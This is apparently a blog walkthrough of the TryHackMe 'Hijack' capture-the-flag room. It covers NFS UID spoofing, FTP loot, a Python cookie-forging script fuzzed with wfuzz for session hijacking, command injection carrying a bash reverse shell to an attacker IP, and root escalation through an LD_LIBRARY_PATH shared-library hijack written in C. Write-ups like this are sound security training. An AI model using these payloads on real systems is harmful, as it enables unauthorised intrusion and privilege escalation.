---
layout: post
title: Hijack writeup (TryHackMe)
author: wizarddos
category: writeups
---
This challange is offensive one and based of hijacking from TryHackMe


So, let's start with nmap scan
```
$ nmap -sC -sV -oN scan.txt $IP
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      35107/tcp   mountd
|   100005  1,2,3      42780/tcp6  mountd
|   100005  1,2,3      47775/udp6  mountd
|   100005  1,2,3      59542/udp   mountd
|   100021  1,3,4      33676/tcp6  nlockmgr
|   100021  1,3,4      41049/tcp   nlockmgr
|   100021  1,3,4      46172/udp6  nlockmgr
|   100021  1,3,4      53469/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs     2-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

So, we have 4 services - `ftp`, `ssh`, `rpcbind`, `http` and `nfs`

I think we can start with `nfs` - maybe there are any mounts for us

#### NFS enumeration

We can start with seeing what do we have to mount
```
$ showmount -e $IP
Export list for 10.10.124.164:
/mnt/share *
```

Okay, let's mount it
```
$ mkdir share
$ sudo mount -t nfs $IP:/mnt/share share 
```

But when we try to open it, we get denied access

But there is a option to bypass it - let's see it's privileges

```
$ ls -la
[...]
-rw-r--r--  1 wizarddos wizarddos 1644 10-24 19:27 scan.txt
drwx------  2 1003           1003 4096 08-08 21:28 share

```

It means, that this folder is owned by user with uid = 1003 -  so we need to update our uid or create a new user with that uid

I've created a dummy one

switch to root and create a user
```
$ sudo su
[...]
# useradd 1003
```

And then edit `/etc/passwd`

```
# nano /etc/passwd
```

Find a user with name `1003` and change his line to this
```
1003:x:1003:1003::/home/1003:/bin/sh
```

Then we can easily access `share` folder - let's see it

```
$ su 1003

$ ls -la share
drwx------ 2 1003           1003 4096 08-08 21:28 .
drwxr-xr-x 3 wizarddos wizarddos 4096 10-24 19:35 ..
-rwx------ 1 1003           1003   46 08-08 21:28 for_employees.txt
```
There is one text file, let's see it 
```
$ cat for_employees.txt
ftp creds :

[REDACTED]
```

We have credentials for `ftp` - That's our next step

#### FTP enumeration
Log into ftp
```
$ ftp $IP
```

We are in - check content of it
```
ftp> ls -la
229 Entering Extended Passive Mode (|||40051|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 .
drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08 19:28 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08 19:28 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08 19:28 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08 19:28 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08 19:28 .profile

```
Oh, we have a bit of interesting stuff here - let's download  `.passwords_list.txt` and `.from_admin.txt` - then we can exit `ftp`

```
ftp> get .passwords_list.txt
local: .passwords_list.txt remote: .passwords_list.txt
229 Entering Extended Passive Mode (|||63909|)
150 Opening BINARY mode data connection for .passwords_list.txt (3150 bytes).
100% |***********************************************************************|  3150      754.70 KiB/s    00:00 ETA
226 Transfer complete.
3150 bytes received in 00:00 (30.65 KiB/s)
ftp> get .from_admin.txt
local: .from_admin.txt remote: .from_admin.txt
229 Entering Extended Passive Mode (|||18581|)
150 Opening BINARY mode data connection for .from_admin.txt (368 bytes).
100% |***********************************************************************|   368       45.42 KiB/s    00:00 ETA
226 Transfer complete.
368 bytes received in 00:00 (3.45 KiB/s)
ftp> exit
```
Let's see froma admin first
```
$ cat .from_admin.txt             
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
             
```
So we may have 2 accounts `rick` and `admin`. But let's check `passwords_list.txt`

I won't be adding it here, but it looks like a bit of wordlist - save it and let's check website now


#### Webstite enumeration

On website I've created a user with credentials `user:user123`

Then, I've logged in with it and something interesting happened 

Instead of typical session id cookie I've had this base64 encoded string
```
dXNlcjo2YWQxNGJhOTk4NmUzNjE1NDIzZGZjYTI1NmQwNGUzZg%3D%3D
```

After decoding it gave me 
```
user:6ad14ba9986e3615423dfca256d04e3f
```

It turns out - that hash is `md5` of our password.

From author of this wonderful box I've got a code for preparing this cookies

```py
import hashlib
import base64

# Open the file and read its lines
with open('.passwords_list.txt', 'r') as f:
    lines = f.readlines()

# Loop through the lines and modify each one
for line in lines:
    # Strip the line of bad characters
    stripped_line = ''.join(filter(str.isalnum, line))
    # Hash the stripped line using MD5
    hashed_line = hashlib.md5(stripped_line.encode('utf-8')).hexdigest()
    # Add "admin:" to the beginning of the hash
    modified_hash = 'admin:' + hashed_line
    # Encode the modified hash to base64
    encoded_hash = base64.b64encode(modified_hash.encode('utf-8'))
    # Print the encoded hash
    print(encoded_hash.decode('ascii'))
```

I've edited a thing there - fixed the name of file. Then called it `oven.py` (as it "bakes" cookies :) )

And run it
```
$ python3 oven.py            
[base64 encoded cookies]
```
It looks like it works - let's make a wordlist out of it
```
$ python3 oven.py > cookies.txt
```

Now, with `wfuzz` we can get final session
```
$ wfuzz -u http://$IP/administration.php -w cookies.txt -X POST -b 'PHPSESSID= FUZZ' --hh 51
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.124.164/administration.php
Total requests: 150

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000082:   200        42 L     66 W       864 Ch      [REDACTED]                                               


```

Copy that payload and put it as `PHPSESSIONID` cookie - then visit `administration.php` - and we have it

We've successfully hijacked session

Now, we have input that checks state of services - luckily it doesn't check `&` symbol, so we can inject commands like `id` 
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Or a reverse shell - set up netcat listener
```
$ nc -lvnp 2137 
```

And use this payload
```
& /bin/bash -c 'bash -i 1>& /dev/tcp/[YOUR IP]/2137 0>&1'
```

Then, after we get the shell - upgrade it
```
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
```

I've found one interesting thing is `config.php`
```
$ cat config.php
cat config.php
<?php
$servername = "localhost";
$username = "rick";
$password = "[REDACTED]";
$dbname = "hijack";

// Create connection
$mysqli = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($mysqli->connect_error) {
  die("Connection failed: " . $mysqli->connect_error);
}
?>
```

Didn't we have user `rick`? Let's try to ssh to him
```
$ ssh rick@$IP

[...]
$
```

It works - get user flag
```
$ cat user.txt
[REDACTED]
```

And as always - last part

#### Privilege Escalation

Check what can we run as `root`
```
$ sudo -l
[sudo] password for rick: 
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2

```

One odd thing is this line
```
env_keep+=LD_LIBRARY_PATH
```

`LD_LIBRARY_PATH` is a list of directories where script searches for shared libraries - so start with printing apache's shared libraries

```
$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007ffd7cb32000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fe1c7227000)
        libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007fe1c7000000)
        libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007fe1c6dce000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fe1c6bb1000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe1c67e7000)
        libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007fe1c65af000)
        libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007fe1c6386000)
        libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007fe1c6181000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe1c5f7d000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fe1c773c000)

```

Okay, our target will be `libcrypt.so.1` file - in `/tmp` create a new file called however you want - Mine is `malware.c`
```
$ touch malware.c
$ nano malware.c
```

Then, let's enter malicious script here - I got it from [this blog](https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/)

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Then, compile it
```
$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/rick/malware.c
```

And lastly - execute that specific command from `sudo -l` results with changing `LD_LIBRARY_PATH` to `/tmp`

So like this
```
$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2

# whoami
root
```

Now, we can get root flag
```
# cat /root/root.txt

██╗░░██╗██╗░░░░░██╗░█████╗░░█████╗░██╗░░██╗
██║░░██║██║░░░░░██║██╔══██╗██╔══██╗██║░██╔╝
███████║██║░░░░░██║███████║██║░░╚═╝█████═╝░
██╔══██║██║██╗░░██║██╔══██║██║░░██╗██╔═██╗░
██║░░██║██║╚█████╔╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

[REDACTED]

```

There is our last flag

And that's it - machine pwned

## Conclusion

I loved this room, really. I've learned a lot

So, I've learned a new PrivEsc technique, session hijacking and a new way to abuse `nfs`

That's it - see you in the next writeups
